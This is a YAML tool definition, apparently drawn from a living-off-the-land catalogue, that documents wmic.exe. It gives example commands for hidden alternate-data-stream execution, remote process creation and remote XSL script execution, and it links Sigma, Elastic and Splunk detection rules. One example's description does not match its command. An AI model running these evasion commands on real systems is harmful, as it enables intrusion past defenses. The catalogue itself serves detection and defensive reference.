---
id: windows-execution-wmic
namespace: windows:execution:wmic
name: wmic
description: 'The WMI command-line (WMIC) utility provides a command-line interface for WMI Located at: C:\Windows\System32\wbem\wmic.exe; C:\Windows\SysWOW64\wbem\wmic.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- system.file.alternate-data-stream
- security.execution.command
- system.file.copy
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- wmic
parameters: []
features: []
execution:
  template: wmic
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Execute a .EXE file stored as an Alternate Data Stream (ADS) (Execute binary file hidden in Alternate data streams to evade defensive counter measures)
  command: wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
- description: Execute calc from wmic (Execute binary from wmic to evade defensive counter measures)
  command: wmic.exe process call create "{CMD}"
- description: Execute evil.exe on the remote system. (Execute binary on a remote system)
  command: wmic.exe /node:"192.168.0.1" process call create "{CMD}"
- description: Create a volume shadow copy of NTDS.dit that can be copied. (Execute binary on remote system)
  command: wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
- description: Executes JScript or VBScript embedded in the target remote XSL stylsheet. (Execute script from remote system)
  command: wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
- description: Copy file from source to destination. (Copy file.)
  command: wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
references:
- label: wmic-how-to-use-process-call-create-with-a-specifi
  url: https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
- label: wmicexe-whitelisting-bypass-hacking.html
  url: https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
- label: '986234811944648707'
  url: https://twitter.com/subTee/status/986234811944648707
techniques:
- defense-evasion
- execution
- collection
- exfiltration
mitre_ids:
- T1564.004
- T1218
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wmic_eventconsumer_creation.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_suspicious_wmi_script.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/persistence_via_windows_management_instrumentation_event_subscription.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- type: splunk
  url: https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/xsl_script_execution_with_wmic.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_wmi_command_attempt.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_process_instantiation_via_wmi.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/detections/endpoint/process_execution_via_wmi.yml
- type: blockrule
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- type: ioc
  description: Wmic retrieving scripts from remote system/Internet location
- type: ioc
  description: DotNet CLR libraries loaded into wmic.exe
- type: ioc
  description: DotNet CLR Usage Log - wmic.exe.log
- type: ioc
  description: wmiprvse.exe writing files
install:
- method: choco
  package_name: wmic
  commands:
  - choco install wmic
---


# wmic

wmic is a Windows LOLBin. The WMI command-line (WMIC) utility provides a command-line interface for WMI Located at: C:\Windows\System32\wbem\wmic.exe; C:\Windows\SysWOW64\wbem\wmic.exe.
